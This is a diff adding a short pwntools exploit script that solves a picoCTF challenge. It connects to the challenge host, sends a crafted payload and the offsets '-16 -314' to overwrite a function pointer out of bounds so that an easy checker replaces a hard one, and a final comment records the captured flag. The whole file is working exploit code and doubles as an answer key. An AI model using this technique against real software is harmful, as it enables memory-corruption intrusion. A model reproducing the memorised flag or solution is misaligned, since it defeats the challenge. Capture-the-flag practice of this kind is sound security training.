@@ -1,0 +1,13 @@
+from pwn import *
+
+# out of bound, to overwrite value of check from  hard_checker to easy_checker
+# https://ctftime.org/writeup/32818
+
+p = remote("saturn.picoctf.net", 56859)
+#p = process("./vulnfo")
+
+payload = "!" * 39 + "2"
+p.sendline(payload.encode())
+p.sendline(b"-16 -314")
+p.interactive()
+#picoCTF{0v3rwrit1ng_P01nt3rs_cc9ab5fc}
